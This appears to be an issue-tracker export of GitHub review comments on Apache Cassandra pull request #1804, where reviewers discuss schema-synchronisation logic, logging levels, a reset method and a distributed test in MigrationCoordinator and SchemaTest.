##########
src/java/org/apache/cassandra/schema/MigrationCoordinator.java:
##########
@@ -369,22 +418,31 @@ private synchronized boolean shouldApplySchemaFor(VersionInfo info)
 
     synchronized Future<Void> reportEndpointVersion(InetAddressAndPort endpoint, UUID version)
     {
+        logger.debug(""Reported schema {} at endpoint {}"", version, endpoint);
         if (ignoredEndpoints.contains(endpoint) || IGNORED_VERSIONS.contains(version))
         {
             endpointVersions.remove(endpoint);
             removeEndpointFromVersion(endpoint, null);
+            logger.debug(""Discarding endpoint {} or schema {} because either endpoint or schema version were marked as ignored"", endpoint, version);
             return FINISHED_FUTURE;
         }
 
         UUID current = endpointVersions.put(endpoint, version);
         if (current != null && current.equals(version))
+        {
+            logger.trace(""Skipping report of schema {} from {} because we already know that"", version, endpoint);
             return FINISHED_FUTURE;
+        }
 
         VersionInfo info = versionInfo.computeIfAbsent(version, VersionInfo::new);
         if (Objects.equals(schemaVersion.get(), version))
+        {
             info.markReceived();
+            logger.trace(""Schema {} from {} has been marked as recevied because it is equal the local schema"", version, endpoint);
+        }
         info.endpoints.add(endpoint);
-        info.requestQueue.addFirst(endpoint);
+        info.requestQueue.addFirst(endpoint); // TODO not sure if it is correct - given we've just marked this schema version as received, why do we add a request to receive it?

Review Comment:
   The same logic is in `pullComplete`.
   Seems to me we `markReceived` before we deal with `requestQueue` in `maybePullSchema`, I am still not sure why though.... looking again into that



;30/Aug/22 14:24;githubbot;600","ekaterinadimitrova2 commented on code in PR #1804:
URL: https://github.com/apache/cassandra/pull/1804#discussion_r958557785


##########
src/java/org/apache/cassandra/schema/MigrationCoordinator.java:
##########
@@ -369,22 +418,31 @@ private synchronized boolean shouldApplySchemaFor(VersionInfo info)
 
     synchronized Future<Void> reportEndpointVersion(InetAddressAndPort endpoint, UUID version)
     {
+        logger.debug(""Reported schema {} at endpoint {}"", version, endpoint);
         if (ignoredEndpoints.contains(endpoint) || IGNORED_VERSIONS.contains(version))
         {
             endpointVersions.remove(endpoint);
             removeEndpointFromVersion(endpoint, null);
+            logger.debug(""Discarding endpoint {} or schema {} because either endpoint or schema version were marked as ignored"", endpoint, version);
             return FINISHED_FUTURE;
         }
 
         UUID current = endpointVersions.put(endpoint, version);
         if (current != null && current.equals(version))
+        {
+            logger.trace(""Skipping report of schema {} from {} because we already know that"", version, endpoint);
             return FINISHED_FUTURE;
+        }
 
         VersionInfo info = versionInfo.computeIfAbsent(version, VersionInfo::new);
         if (Objects.equals(schemaVersion.get(), version))
+        {
             info.markReceived();
+            logger.trace(""Schema {} from {} has been marked as recevied because it is equal the local schema"", version, endpoint);
+        }
         info.endpoints.add(endpoint);
-        info.requestQueue.addFirst(endpoint);
+        info.requestQueue.addFirst(endpoint); // TODO not sure if it is correct - given we've just marked this schema version as received, why do we add a request to receive it?

Review Comment:
   Yes, reading back that is right but then it is confusing why in those cases we add to the requestQueue which seems to be a queue of endpoints from which we are going to fetch.... do we need still to fetch? :-) 



;30/Aug/22 14:28;githubbot;600","ekaterinadimitrova2 commented on code in PR #1804:
URL: https://github.com/apache/cassandra/pull/1804#discussion_r958560419


##########
src/java/org/apache/cassandra/schema/MigrationCoordinator.java:
##########
@@ -369,22 +418,31 @@ private synchronized boolean shouldApplySchemaFor(VersionInfo info)
 
     synchronized Future<Void> reportEndpointVersion(InetAddressAndPort endpoint, UUID version)
     {
+        logger.debug(""Reported schema {} at endpoint {}"", version, endpoint);
         if (ignoredEndpoints.contains(endpoint) || IGNORED_VERSIONS.contains(version))
         {
             endpointVersions.remove(endpoint);
             removeEndpointFromVersion(endpoint, null);
+            logger.debug(""Discarding endpoint {} or schema {} because either endpoint or schema version were marked as ignored"", endpoint, version);
             return FINISHED_FUTURE;
         }
 
         UUID current = endpointVersions.put(endpoint, version);
         if (current != null && current.equals(version))
+        {
+            logger.trace(""Skipping report of schema {} from {} because we already know that"", version, endpoint);
             return FINISHED_FUTURE;
+        }
 
         VersionInfo info = versionInfo.computeIfAbsent(version, VersionInfo::new);
         if (Objects.equals(schemaVersion.get(), version))
+        {
             info.markReceived();
+            logger.trace(""Schema {} from {} has been marked as recevied because it is equal the local schema"", version, endpoint);
+        }
         info.endpoints.add(endpoint);
-        info.requestQueue.addFirst(endpoint);
+        info.requestQueue.addFirst(endpoint); // TODO not sure if it is correct - given we've just marked this schema version as received, why do we add a request to receive it?

Review Comment:
   Oh, that is covered in maybePullSchema, we check whether it was already marked received on the first line... It is just not immediately clear before you look into maybePullSchema... perhaps we can simplify or at least comment a bit...



;30/Aug/22 14:30;githubbot;600","ekaterinadimitrova2 commented on code in PR #1804:
URL: https://github.com/apache/cassandra/pull/1804#discussion_r958571115


##########
src/java/org/apache/cassandra/schema/MigrationCoordinator.java:
##########
@@ -369,22 +418,31 @@ private synchronized boolean shouldApplySchemaFor(VersionInfo info)
 
     synchronized Future<Void> reportEndpointVersion(InetAddressAndPort endpoint, UUID version)
     {
+        logger.debug(""Reported schema {} at endpoint {}"", version, endpoint);
         if (ignoredEndpoints.contains(endpoint) || IGNORED_VERSIONS.contains(version))
         {
             endpointVersions.remove(endpoint);
             removeEndpointFromVersion(endpoint, null);
+            logger.debug(""Discarding endpoint {} or schema {} because either endpoint or schema version were marked as ignored"", endpoint, version);
             return FINISHED_FUTURE;
         }
 
         UUID current = endpointVersions.put(endpoint, version);
         if (current != null && current.equals(version))
+        {
+            logger.trace(""Skipping report of schema {} from {} because we already know that"", version, endpoint);
             return FINISHED_FUTURE;
+        }
 
         VersionInfo info = versionInfo.computeIfAbsent(version, VersionInfo::new);
         if (Objects.equals(schemaVersion.get(), version))
+        {
             info.markReceived();
+            logger.trace(""Schema {} from {} has been marked as recevied because it is equal the local schema"", version, endpoint);
+        }
         info.endpoints.add(endpoint);
-        info.requestQueue.addFirst(endpoint);
+        info.requestQueue.addFirst(endpoint); // TODO not sure if it is correct - given we've just marked this schema version as received, why do we add a request to receive it?

Review Comment:
   At that point we  do not remove the endpoint from the queue, we seem to remove it next time we call maybePullSchema an we iterate the queue. Not sure why that approach was taken really and not just not adding it at all in case we markReceived... I will experiment



;30/Aug/22 14:39;githubbot;600","ekaterinadimitrova2 commented on code in PR #1804:
URL: https://github.com/apache/cassandra/pull/1804#discussion_r958571115


##########
src/java/org/apache/cassandra/schema/MigrationCoordinator.java:
##########
@@ -369,22 +418,31 @@ private synchronized boolean shouldApplySchemaFor(VersionInfo info)
 
     synchronized Future<Void> reportEndpointVersion(InetAddressAndPort endpoint, UUID version)
     {
+        logger.debug(""Reported schema {} at endpoint {}"", version, endpoint);
         if (ignoredEndpoints.contains(endpoint) || IGNORED_VERSIONS.contains(version))
         {
             endpointVersions.remove(endpoint);
             removeEndpointFromVersion(endpoint, null);
+            logger.debug(""Discarding endpoint {} or schema {} because either endpoint or schema version were marked as ignored"", endpoint, version);
             return FINISHED_FUTURE;
         }
 
         UUID current = endpointVersions.put(endpoint, version);
         if (current != null && current.equals(version))
+        {
+            logger.trace(""Skipping report of schema {} from {} because we already know that"", version, endpoint);
             return FINISHED_FUTURE;
+        }
 
         VersionInfo info = versionInfo.computeIfAbsent(version, VersionInfo::new);
         if (Objects.equals(schemaVersion.get(), version))
+        {
             info.markReceived();
+            logger.trace(""Schema {} from {} has been marked as recevied because it is equal the local schema"", version, endpoint);
+        }
         info.endpoints.add(endpoint);
-        info.requestQueue.addFirst(endpoint);
+        info.requestQueue.addFirst(endpoint); // TODO not sure if it is correct - given we've just marked this schema version as received, why do we add a request to receive it?

Review Comment:
   At that point we  do not remove the endpoint from the queue, we seem to remove it next time we call maybePullSchema and we iterate the queue. Not sure why that approach was taken really and not just not adding it at all in case we markReceived... I will experiment



;30/Aug/22 14:39;githubbot;600","adelapena commented on code in PR #1804:
URL: https://github.com/apache/cassandra/pull/1804#discussion_r958581524


##########
src/java/org/apache/cassandra/schema/MigrationCoordinator.java:
##########
@@ -369,22 +418,31 @@ private synchronized boolean shouldApplySchemaFor(VersionInfo info)
 
     synchronized Future<Void> reportEndpointVersion(InetAddressAndPort endpoint, UUID version)
     {
+        logger.debug(""Reported schema {} at endpoint {}"", version, endpoint);
         if (ignoredEndpoints.contains(endpoint) || IGNORED_VERSIONS.contains(version))
         {
             endpointVersions.remove(endpoint);
             removeEndpointFromVersion(endpoint, null);
+            logger.debug(""Discarding endpoint {} or schema {} because either endpoint or schema version were marked as ignored"", endpoint, version);
             return FINISHED_FUTURE;
         }
 
         UUID current = endpointVersions.put(endpoint, version);
         if (current != null && current.equals(version))
+        {
+            logger.trace(""Skipping report of schema {} from {} because we already know that"", version, endpoint);
             return FINISHED_FUTURE;
+        }
 
         VersionInfo info = versionInfo.computeIfAbsent(version, VersionInfo::new);
         if (Objects.equals(schemaVersion.get(), version))
+        {
             info.markReceived();
+            logger.trace(""Schema {} from {} has been marked as recevied because it is equal the local schema"", version, endpoint);
+        }
         info.endpoints.add(endpoint);
-        info.requestQueue.addFirst(endpoint);
+        info.requestQueue.addFirst(endpoint); // TODO not sure if it is correct - given we've just marked this schema version as received, why do we add a request to receive it?

Review Comment:
   So we add it to `requestQueue` because we might need to fetch it, unless it has been marked as received. I guess the simplified version would be adding the endpoint to the request queue only if hasn't been marked, something like:
   ```java
   VersionInfo info = versionInfo.computeIfAbsent(version, VersionInfo::new);
   info.endpoints.add(endpoint);
   logger.trace(""Added endpoint {} to schema {}: {}"", endpoint, info.version, info);
   
   if (Objects.equals(schemaVersion.get(), version))
   {
       info.markReceived();
       logger.trace(""Schema {} from {} has been marked as received because it is equal the local schema"", version, endpoint);
   }
   else
   {
       info.requestQueue.addFirst(endpoint);
   }
   ```



;30/Aug/22 14:47;githubbot;600","ekaterinadimitrova2 commented on code in PR #1804:
URL: https://github.com/apache/cassandra/pull/1804#discussion_r958612158


##########
src/java/org/apache/cassandra/schema/MigrationCoordinator.java:
##########
@@ -369,22 +418,31 @@ private synchronized boolean shouldApplySchemaFor(VersionInfo info)
 
     synchronized Future<Void> reportEndpointVersion(InetAddressAndPort endpoint, UUID version)
     {
+        logger.debug(""Reported schema {} at endpoint {}"", version, endpoint);
         if (ignoredEndpoints.contains(endpoint) || IGNORED_VERSIONS.contains(version))
         {
             endpointVersions.remove(endpoint);
             removeEndpointFromVersion(endpoint, null);
+            logger.debug(""Discarding endpoint {} or schema {} because either endpoint or schema version were marked as ignored"", endpoint, version);
             return FINISHED_FUTURE;
         }
 
         UUID current = endpointVersions.put(endpoint, version);
         if (current != null && current.equals(version))
+        {
+            logger.trace(""Skipping report of schema {} from {} because we already know that"", version, endpoint);
             return FINISHED_FUTURE;
+        }
 
         VersionInfo info = versionInfo.computeIfAbsent(version, VersionInfo::new);
         if (Objects.equals(schemaVersion.get(), version))
+        {
             info.markReceived();
+            logger.trace(""Schema {} from {} has been marked as recevied because it is equal the local schema"", version, endpoint);
+        }
         info.endpoints.add(endpoint);
-        info.requestQueue.addFirst(endpoint);
+        info.requestQueue.addFirst(endpoint); // TODO not sure if it is correct - given we've just marked this schema version as received, why do we add a request to receive it?

Review Comment:
   Yes, that was my point but I have to test if it can have some other side effects that we might miss... 



;30/Aug/22 15:12;githubbot;600","ekaterinadimitrova2 commented on code in PR #1804:
URL: https://github.com/apache/cassandra/pull/1804#discussion_r958688506


##########
src/java/org/apache/cassandra/schema/MigrationCoordinator.java:
##########
@@ -369,22 +418,31 @@ private synchronized boolean shouldApplySchemaFor(VersionInfo info)
 
     synchronized Future<Void> reportEndpointVersion(InetAddressAndPort endpoint, UUID version)
     {
+        logger.debug(""Reported schema {} at endpoint {}"", version, endpoint);
         if (ignoredEndpoints.contains(endpoint) || IGNORED_VERSIONS.contains(version))
         {
             endpointVersions.remove(endpoint);
             removeEndpointFromVersion(endpoint, null);
+            logger.debug(""Discarding endpoint {} or schema {} because either endpoint or schema version were marked as ignored"", endpoint, version);
             return FINISHED_FUTURE;
         }
 
         UUID current = endpointVersions.put(endpoint, version);
         if (current != null && current.equals(version))
+        {
+            logger.trace(""Skipping report of schema {} from {} because we already know that"", version, endpoint);
             return FINISHED_FUTURE;
+        }
 
         VersionInfo info = versionInfo.computeIfAbsent(version, VersionInfo::new);
         if (Objects.equals(schemaVersion.get(), version))
+        {
             info.markReceived();
+            logger.trace(""Schema {} from {} has been marked as recevied because it is equal the local schema"", version, endpoint);
+        }
         info.endpoints.add(endpoint);
-        info.requestQueue.addFirst(endpoint);
+        info.requestQueue.addFirst(endpoint); // TODO not sure if it is correct - given we've just marked this schema version as received, why do we add a request to receive it?

Review Comment:
   At least the `MigrationCoordinatorTest` and `SchemaTest` in-jvm and unit test pass for me locally with this change



;30/Aug/22 16:20;githubbot;600","ekaterinadimitrova2 commented on code in PR #1804:
URL: https://github.com/apache/cassandra/pull/1804#discussion_r958688506


##########
src/java/org/apache/cassandra/schema/MigrationCoordinator.java:
##########
@@ -369,22 +418,31 @@ private synchronized boolean shouldApplySchemaFor(VersionInfo info)
 
     synchronized Future<Void> reportEndpointVersion(InetAddressAndPort endpoint, UUID version)
     {
+        logger.debug(""Reported schema {} at endpoint {}"", version, endpoint);
         if (ignoredEndpoints.contains(endpoint) || IGNORED_VERSIONS.contains(version))
         {
             endpointVersions.remove(endpoint);
             removeEndpointFromVersion(endpoint, null);
+            logger.debug(""Discarding endpoint {} or schema {} because either endpoint or schema version were marked as ignored"", endpoint, version);
             return FINISHED_FUTURE;
         }
 
         UUID current = endpointVersions.put(endpoint, version);
         if (current != null && current.equals(version))
+        {
+            logger.trace(""Skipping report of schema {} from {} because we already know that"", version, endpoint);
             return FINISHED_FUTURE;
+        }
 
         VersionInfo info = versionInfo.computeIfAbsent(version, VersionInfo::new);
         if (Objects.equals(schemaVersion.get(), version))
+        {
             info.markReceived();
+            logger.trace(""Schema {} from {} has been marked as recevied because it is equal the local schema"", version, endpoint);
+        }
         info.endpoints.add(endpoint);
-        info.requestQueue.addFirst(endpoint);
+        info.requestQueue.addFirst(endpoint); // TODO not sure if it is correct - given we've just marked this schema version as received, why do we add a request to receive it?

Review Comment:
   At least the `MigrationCoordinatorTest` and `SchemaTest` (both in-jvm and unit tests) pass for me locally with this change



;30/Aug/22 16:21;githubbot;600","jacek-lewandowski commented on code in PR #1804:
URL: https://github.com/apache/cassandra/pull/1804#discussion_r960413881


##########
test/distributed/org/apache/cassandra/distributed/test/SchemaTest.java:
##########
@@ -95,25 +107,54 @@ private void selectSilent(Cluster cluster, String name)
     @Test
     public void schemaReset() throws Throwable
     {
+        CassandraRelevantProperties.MIGRATION_DELAY.setLong(10000);
+        CassandraRelevantProperties.SCHEMA_PULL_INTERVAL.setLong(10000);
         try (Cluster cluster = init(Cluster.build(2).withConfig(cfg -> cfg.with(Feature.GOSSIP, Feature.NETWORK)).start()))
         {
             cluster.schemaChange(""CREATE TABLE "" + KEYSPACE + "".tbl (pk INT PRIMARY KEY, v TEXT)"");
 
             assertTrue(cluster.get(1).callOnInstance(() -> Schema.instance.getTableMetadata(KEYSPACE, ""tbl"") != null));
             assertTrue(cluster.get(2).callOnInstance(() -> Schema.instance.getTableMetadata(KEYSPACE, ""tbl"") != null));
 
+            // now we have a table tbl in the schema of both nodes
+
             cluster.get(2).shutdown().get();
 
-            // when schema is removed and there is no other node to fetch it from, node 1 should be left with clean schema
-            cluster.get(1).runOnInstance(() -> Schema.instance.resetLocalSchema());
+            Awaitility.await().atMost(Duration.ofSeconds(30)) // wait until node 1 notices that node 2 is dead
+                      .until(() -> cluster.get(1).callOnInstance(() -> Gossiper.instance.getLiveMembers().stream().allMatch(e -> e.equals(FBUtilities.getBroadcastAddressAndPort()))));
+
+            // when there is no node to fetch the schema from, reset local schema should immediately fail
+            Assertions.assertThatExceptionOfType(RuntimeException.class).isThrownBy(() -> {
+                cluster.get(1).runOnInstance(() -> Schema.instance.resetLocalSchema());

Review Comment:
   > Please ignore this last suggestion, I forgot that method references don't work in the dtest framework.
   
   heh... yes, I struggled this problem some time ago. `runElsewhere(Schema.instance::resetLocalSchema)` means more or less:
   ```java
   Schema schema = Schema.instance;
   runElsewhere(() -> schema.resetLocalSchema());
   ```
   so it is something completely different :-)
   



;01/Sep/22 09:14;githubbot;600","jacek-lewandowski commented on code in PR #1804:
URL: https://github.com/apache/cassandra/pull/1804#discussion_r960506990


##########
src/java/org/apache/cassandra/schema/MigrationCoordinator.java:
##########
@@ -323,7 +372,7 @@ private boolean shouldPullFromEndpoint(InetAddressAndPort endpoint)
 
         if (!messagingService.versions.knows(endpoint))
         {
-            logger.debug(""Not pulling schema from {} because their messaging version is unknown"", endpoint);
+            logger.trace(""Not pulling schema from {} because their messaging version is unknown"", endpoint);

Review Comment:
   I'll revert



;01/Sep/22 10:58;githubbot;600","jacek-lewandowski commented on code in PR #1804:
URL: https://github.com/apache/cassandra/pull/1804#discussion_r960509159


##########
src/java/org/apache/cassandra/schema/MigrationCoordinator.java:
##########
@@ -323,7 +372,7 @@ private boolean shouldPullFromEndpoint(InetAddressAndPort endpoint)
 
         if (!messagingService.versions.knows(endpoint))
         {
-            logger.debug(""Not pulling schema from {} because their messaging version is unknown"", endpoint);
+            logger.trace(""Not pulling schema from {} because their messaging version is unknown"", endpoint);

Review Comment:
   but actually I considered this message as temporary situation - when the messaging version is eventually known, the schema is either pulled or it is logged that the messaging version is incompatible (at debug level)



;01/Sep/22 11:01;githubbot;600","jacek-lewandowski commented on code in PR #1804:
URL: https://github.com/apache/cassandra/pull/1804#discussion_r960515250


##########
src/java/org/apache/cassandra/schema/MigrationCoordinator.java:
##########
@@ -403,16 +461,61 @@ private synchronized void removeEndpointFromVersion(InetAddressAndPort endpoint,
             return;
 
         info.endpoints.remove(endpoint);
+        logger.trace(""Removed endpoint {} from schema {}: {}"", endpoint, version, info);
         if (info.endpoints.isEmpty())
         {
             info.waitQueue.signalAll();
             versionInfo.remove(version);
+            logger.trace(""Removed schema info: {}"", info);
         }
     }
 
+    /**
+     * Resets the migration coordinator by notifying all waiting threads and removing all the existing version info.
+     * Then, it is populated with the information about schema versions on different endpoints provided by Gossiper.
+     * Each version is marked as unreceived so the migration coordinator will start pulling schemas from other nodes.
+     */
+    synchronized void reset()
+    {
+        logger.info(""Resetting migration coordinator..."");
+
+        this.endpointVersions.clear();
+
+        Iterator<Map.Entry<UUID, VersionInfo>> it = versionInfo.entrySet().iterator();
+        while (it.hasNext())
+        {
+            Map.Entry<UUID, VersionInfo> entry = it.next();
+            it.remove();
+            entry.getValue().waitQueue.signal();
+        }
+
+        // now report again the versions we are aware of
+        gossiper.getLiveMembers().forEach(endpoint -> {
+            if (FBUtilities.getBroadcastAddressAndPort().equals(endpoint))
+            {
+                reportEndpointVersion(endpoint, schemaVersion.get());
+            }
+            else
+            {
+                EndpointState state = gossiper.getEndpointStateForEndpoint(endpoint);
+                if (state != null)
+                {
+                    UUID v = state.getSchemaVersion();
+                    if (v != null)
+                    {
+                        reportEndpointVersion(endpoint, v);
+                    }
+                }
+            }
+        });
+    }
+
     synchronized void removeAndIgnoreEndpoint(InetAddressAndPort endpoint)
     {
+        logger.debug(""Removing and ignoring endpoint {}"", endpoint);
         Preconditions.checkArgument(endpoint != null);
+        // TODO The endpoint address is now ignored but when a node with the same address is added again later,
+        //  there will be no way to include it in schema synchronization other than restarting each other node

Review Comment:
   Ok, but where do you want it to be documented? I think we should rather fix it



;01/Sep/22 11:06;githubbot;600","jacek-lewandowski commented on code in PR #1804:
URL: https://github.com/apache/cassandra/pull/1804#discussion_r960521100


##########
src/java/org/apache/cassandra/schema/Schema.java:
##########
@@ -611,18 +613,42 @@ public SchemaTransformationResult transform(SchemaTransformation transformation,
      * Clear all locally stored schema information and fetch schema from another node.
      * Called by user (via JMX) who wants to get rid of schema disagreement.
      */
-    public synchronized void resetLocalSchema()

Review Comment:
   Most general answer to that question is - because we are waiting in this method. The method simply mark a schema that is should be refreshed and wait until it happens. However, the schema would be unable to refresh if we hold a lock because we no changes could be applied then. Note that, the changes are applied from the MigrationCoordinator thread, usually a different to the called thread.
   



;01/Sep/22 11:11;githubbot;600","jacek-lewandowski commented on code in PR #1804:
URL: https://github.com/apache/cassandra/pull/1804#discussion_r960528059


##########
src/java/org/apache/cassandra/schema/SchemaUpdateHandler.java:
##########
@@ -63,14 +64,15 @@
      * refreshed, the callbacks provided in the factory method are executed, and the updated schema version is announced.
      *
      * @param local whether we should reset with locally stored schema or fetch the schema from other nodes
-     * @return transformation result
      */
-    SchemaTransformationResult reset(boolean local);
+    void reset(boolean local);
 
     /**
      * Clears the locally stored schema entirely. After this operation the schema is equal to {@link DistributedSchema#EMPTY}.
      * The method does not execute any callback. It is indended to reinitialize the schema later using the method
      * {@link #reset(boolean)}.
+     *
+     * @return

Review Comment:
   ok, and btw. I suppose the more adequate names for those methods now would be reset -> sync, clear -> refresh



;01/Sep/22 11:18;githubbot;600","jacek-lewandowski commented on code in PR #1804:
URL: https://github.com/apache/cassandra/pull/1804#discussion_r960533987


##########
test/distributed/org/apache/cassandra/distributed/test/SchemaTest.java:
##########
@@ -95,25 +107,54 @@ private void selectSilent(Cluster cluster, String name)
     @Test
     public void schemaReset() throws Throwable
     {
+        CassandraRelevantProperties.MIGRATION_DELAY.setLong(10000);
+        CassandraRelevantProperties.SCHEMA_PULL_INTERVAL.setLong(10000);
         try (Cluster cluster = init(Cluster.build(2).withConfig(cfg -> cfg.with(Feature.GOSSIP, Feature.NETWORK)).start()))
         {
             cluster.schemaChange(""CREATE TABLE "" + KEYSPACE + "".tbl (pk INT PRIMARY KEY, v TEXT)"");
 
             assertTrue(cluster.get(1).callOnInstance(() -> Schema.instance.getTableMetadata(KEYSPACE, ""tbl"") != null));
             assertTrue(cluster.get(2).callOnInstance(() -> Schema.instance.getTableMetadata(KEYSPACE, ""tbl"") != null));
 
+            // now we have a table tbl in the schema of both nodes
+
             cluster.get(2).shutdown().get();
 
-            // when schema is removed and there is no other node to fetch it from, node 1 should be left with clean schema
-            cluster.get(1).runOnInstance(() -> Schema.instance.resetLocalSchema());
+            Awaitility.await().atMost(Duration.ofSeconds(30)) // wait until node 1 notices that node 2 is dead
+                      .until(() -> cluster.get(1).callOnInstance(() -> Gossiper.instance.getLiveMembers().stream().allMatch(e -> e.equals(FBUtilities.getBroadcastAddressAndPort()))));

Review Comment:
   I will, but with the current formatting rules I can see no way to format it nicely



;01/Sep/22 11:25;githubbot;600","jacek-lewandowski commented on code in PR #1804:
URL: https://github.com/apache/cassandra/pull/1804#discussion_r960536452


##########
test/distributed/org/apache/cassandra/distributed/test/SchemaTest.java:
##########
@@ -95,25 +107,54 @@ private void selectSilent(Cluster cluster, String name)
     @Test
     public void schemaReset() throws Throwable
     {
+        CassandraRelevantProperties.MIGRATION_DELAY.setLong(10000);
+        CassandraRelevantProperties.SCHEMA_PULL_INTERVAL.setLong(10000);
         try (Cluster cluster = init(Cluster.build(2).withConfig(cfg -> cfg.with(Feature.GOSSIP, Feature.NETWORK)).start()))
         {
             cluster.schemaChange(""CREATE TABLE "" + KEYSPACE + "".tbl (pk INT PRIMARY KEY, v TEXT)"");
 
             assertTrue(cluster.get(1).callOnInstance(() -> Schema.instance.getTableMetadata(KEYSPACE, ""tbl"") != null));
             assertTrue(cluster.get(2).callOnInstance(() -> Schema.instance.getTableMetadata(KEYSPACE, ""tbl"") != null));
 
+            // now we have a table tbl in the schema of both nodes
+
             cluster.get(2).shutdown().get();
 
-            // when schema is removed and there is no other node to fetch it from, node 1 should be left with clean schema
-            cluster.get(1).runOnInstance(() -> Schema.instance.resetLocalSchema());
+            Awaitility.await().atMost(Duration.ofSeconds(30)) // wait until node 1 notices that node 2 is dead
+                      .until(() -> cluster.get(1).callOnInstance(() -> Gossiper.instance.getLiveMembers().stream().allMatch(e -> e.equals(FBUtilities.getBroadcastAddressAndPort()))));
+
+            // when there is no node to fetch the schema from, reset local schema should immediately fail
+            Assertions.assertThatExceptionOfType(RuntimeException.class).isThrownBy(() -> {
+                cluster.get(1).runOnInstance(() -> Schema.instance.resetLocalSchema());
+            }).withMessageContaining(""Cannot reset local schema when there are no other live nodes"");
+
+            // now, let's make a disagreement, the shutdown node 2 has a definition of tbl, while the running node 1 does not
+            cluster.get(1).runOnInstance(() -> {
+                Schema.instance.transform(current -> Schema.instance.distributedKeyspaces().without(KEYSPACE), false);
+             });
+
             assertTrue(cluster.get(1).callOnInstance(() -> Schema.instance.getTableMetadata(KEYSPACE, ""tbl"") == null));
 
+            // clear will wait until it receives schema from some other node
+            // also if we start the node2 first, schema of node2 will be synced to schema of node1 because node1 has the newest change (dropping the table)
+            // if we run clean on node1 first, it will advertise empty schema to node2 and apply the schema from it without merging
+            CompletableFuture<Boolean> clear1 = CompletableFuture.supplyAsync(() -> cluster.get(1).callOnInstance(() -> Schema.instance.updateHandler.clear().awaitUninterruptibly(1, TimeUnit.MINUTES)));

Review Comment:
   again, the formatting rules does not allow for make it nicely to my knowledge



;01/Sep/22 11:28;githubbot;600","jacek-lewandowski commented on code in PR #1804:
URL: https://github.com/apache/cassandra/pull/1804#discussion_r960540652


##########
src/java/org/apache/cassandra/schema/MigrationCoordinator.java:
##########
@@ -180,6 +199,18 @@ boolean wasReceived()
         {
             return receivedSchema;
         }
+
+        @Override
+        public String toString()

Review Comment:
   we do not have to call `.toString()` explicitly in statements like `log.info(""bla bla bla {}"", info);` :)
   



;01/Sep/22 11:33;githubbot;600","jacek-lewandowski commented on code in PR #1804:
URL: https://github.com/apache/cassandra/pull/1804#discussion_r960556255


##########
src/java/org/apache/cassandra/schema/MigrationCoordinator.java:
##########
@@ -369,22 +418,31 @@ private synchronized boolean shouldApplySchemaFor(VersionInfo info)
 
     synchronized Future<Void> reportEndpointVersion(InetAddressAndPort endpoint, UUID version)
     {
+        logger.debug(""Reported schema {} at endpoint {}"", version, endpoint);
         if (ignoredEndpoints.contains(endpoint) || IGNORED_VERSIONS.contains(version))
         {
             endpointVersions.remove(endpoint);
             removeEndpointFromVersion(endpoint, null);
+            logger.debug(""Discarding endpoint {} or schema {} because either endpoint or schema version were marked as ignored"", endpoint, version);
             return FINISHED_FUTURE;
         }
 
         UUID current = endpointVersions.put(endpoint, version);
         if (current != null && current.equals(version))
+        {
+            logger.trace(""Skipping report of schema {} from {} because we already know that"", version, endpoint);
             return FINISHED_FUTURE;
+        }
 
         VersionInfo info = versionInfo.computeIfAbsent(version, VersionInfo::new);
         if (Objects.equals(schemaVersion.get(), version))
+        {
             info.markReceived();
+            logger.trace(""Schema {} from {} has been marked as recevied because it is equal the local schema"", version, endpoint);
+        }
         info.endpoints.add(endpoint);
-        info.requestQueue.addFirst(endpoint);
+        info.requestQueue.addFirst(endpoint); // TODO not sure if it is correct - given we've just marked this schema version as received, why do we add a request to receive it?

Review Comment:
   exactly, that was what I've commented - ""...given we've just marked this schema version as received..."" :-)



;01/Sep/22 11:51;githubbot;600","jacek-lewandowski commented on PR #1804:
URL: https://github.com/apache/cassandra/pull/1804#issuecomment-1234182091

   Thank you for thorough review, I've applied your suggestions


;01/Sep/22 12:01;githubbot;600","ekaterinadimitrova2 commented on code in PR #1804:
URL: https://github.com/apache/cassandra/pull/1804#discussion_r960732388


##########
src/java/org/apache/cassandra/schema/MigrationCoordinator.java:
##########
@@ -403,16 +461,61 @@ private synchronized void removeEndpointFromVersion(InetAddressAndPort endpoint,
             return;
 
         info.endpoints.remove(endpoint);
+        logger.trace(""Removed endpoint {} from schema {}: {}"", endpoint, version, info);
         if (info.endpoints.isEmpty())
         {
             info.waitQueue.signalAll();
             versionInfo.remove(version);
+            logger.trace(""Removed schema info: {}"", info);
         }
     }
 
+    /**
+     * Resets the migration coordinator by notifying all waiting threads and removing all the existing version info.
+     * Then, it is populated with the information about schema versions on different endpoints provided by Gossiper.
+     * Each version is marked as unreceived so the migration coordinator will start pulling schemas from other nodes.
+     */
+    synchronized void reset()
+    {
+        logger.info(""Resetting migration coordinator..."");
+
+        this.endpointVersions.clear();
+
+        Iterator<Map.Entry<UUID, VersionInfo>> it = versionInfo.entrySet().iterator();
+        while (it.hasNext())
+        {
+            Map.Entry<UUID, VersionInfo> entry = it.next();
+            it.remove();
+            entry.getValue().waitQueue.signal();
+        }
+
+        // now report again the versions we are aware of
+        gossiper.getLiveMembers().forEach(endpoint -> {
+            if (FBUtilities.getBroadcastAddressAndPort().equals(endpoint))
+            {
+                reportEndpointVersion(endpoint, schemaVersion.get());
+            }
+            else
+            {
+                EndpointState state = gossiper.getEndpointStateForEndpoint(endpoint);
+                if (state != null)
+                {
+                    UUID v = state.getSchemaVersion();
+                    if (v != null)
+                    {
+                        reportEndpointVersion(endpoint, v);
+                    }
+                }
+            }
+        });
+    }
+
     synchronized void removeAndIgnoreEndpoint(InetAddressAndPort endpoint)
     {
+        logger.debug(""Removing and ignoring endpoint {}"", endpoint);
         Preconditions.checkArgument(endpoint != null);
+        // TODO The endpoint address is now ignored but when a node with the same address is added again later,
+        //  there will be no way to include it in schema synchronization other than restarting each other node

Review Comment:
   Then in a follow up ticket in order to be fixed and add the number in this comment? WDYT?
   



;01/Sep/22 14:33;githubbot;600","ekaterinadimitrova2 commented on code in PR #1804:
URL: https://github.com/apache/cassandra/pull/1804#discussion_r968617828


##########
test/distributed/org/apache/cassandra/distributed/test/SchemaTest.java:
##########
@@ -93,70 +99,98 @@ private void selectSilent(Cluster cluster, String name)
             Throwable cause = e;
             while (cause != null)
             {
-                if (cause.getMessage() != null && cause.getMessage().contains(""Unknown column ""+name+"" during deserialization""))
+                if (cause.getMessage() != null && cause.getMessage().contains(""Unknown column "" + name + "" during deserialization""))
                     causeIsUnknownColumn = true;
                 cause = cause.getCause();
             }
             assertTrue(causeIsUnknownColumn);
         }
     }
 
+    /**
+     * The purpose of this test is to verify manual schema reset functinality.
+     * <p>
